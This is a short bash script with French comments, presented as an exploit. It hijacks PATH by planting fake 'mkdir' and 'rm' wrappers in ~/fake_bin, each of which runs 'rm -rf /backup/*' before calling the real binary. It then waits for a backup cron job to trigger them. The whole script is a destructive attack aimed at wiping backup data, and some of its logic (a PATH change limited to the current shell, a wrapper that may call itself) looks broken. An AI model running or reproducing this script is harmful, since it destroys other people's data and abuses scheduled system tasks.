#!/bin/bash

echo "[+] Démarrage de l'exploitation simplifiée"

# Préparation des répertoires
mkdir -p ~/fake_bin

# Méthode principale : Détournement de binaires via PATH
echo "[*] Création de binaires détournés..."

# Version simplifiée pour mkdir (utilisé par le script de backup)
cat > ~/fake_bin/mkdir <<EOL
#!/bin/bash
echo "Tentative d'exploitation via mkdir détourné" > ~/exploit.log
rm -rf /backup/* 2>/dev/null
/usr/bin/mkdir "\$@"
EOL
chmod +x ~/fake_bin/mkdir

# Version simplifiée pour rm (utilisé par le script de backup)
cat > ~/fake_bin/rm <<EOL
#!/bin/bash
echo "Tentative d'exploitation via rm détourné" >> ~/exploit.log
rm -rf /backup/* 2>/dev/null
/usr/bin/rm "\$@"
EOL
chmod +x ~/fake_bin/rm

# Ajout du répertoire au PATH
export PATH=~/fake_bin:$PATH
echo "[*] PATH modifié: $PATH"

# Créer un lien symbolique simple
ln -sf /backup ~/backup_link

echo "[+] Configuration terminée. Attendez environ 5 minutes que le cron s'exécute"
echo "[+] Vérifiez le résultat avec 'ls -la /backup' et 'cat ~/exploit.log'"
